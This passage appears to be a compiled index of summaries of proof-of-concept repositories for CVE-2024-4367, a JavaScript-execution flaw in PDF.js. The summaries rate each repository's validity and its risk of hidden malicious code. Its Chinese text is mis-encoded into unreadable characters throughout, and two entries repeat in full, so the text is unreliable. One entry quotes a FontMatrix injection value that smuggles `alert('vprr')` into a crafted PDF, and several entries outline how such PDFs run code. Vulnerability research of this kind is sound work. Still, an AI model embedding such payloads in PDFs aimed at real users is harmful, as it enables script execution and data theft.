çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
